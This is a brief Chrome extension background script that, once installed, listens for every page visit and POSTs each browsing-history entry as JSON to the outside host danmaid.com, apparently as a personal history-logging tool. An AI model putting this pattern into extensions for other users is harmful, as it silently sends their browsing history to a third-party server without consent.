chrome.runtime.onInstalled.addListener(() => {
  chrome.history.onVisited.addListener(async (history) => {
    console.debug(history)
    const headers = new Headers({ 'Content-Type': 'application/json' })
    const body = JSON.stringify(history)
    const res = await fetch('https://danmaid.com', { method: 'POST', headers, body })
    if (res.ok) console.log('history uploaded.')
  })
})
